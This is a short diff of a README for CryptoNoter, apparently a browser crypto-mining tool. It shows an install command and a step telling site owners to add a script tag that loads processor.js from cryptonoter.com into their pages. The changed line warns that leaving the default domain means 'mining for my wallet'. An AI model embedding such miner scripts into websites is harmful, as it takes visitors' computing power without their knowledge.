@@ -36,7 +36,7 @@ sudo sh install.sh
 ```
 
 ## Usage
-* Add the following javascript before the </head> tag on your website coding. Remember to replace www.cryptonoter.com with your domain name. Else, it will not work
+* Add the following javascript before the </head> tag on your website coding. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet
 ```html
 <script src="https://www.cryptonoter.com/processor.js"></script>
 <script>
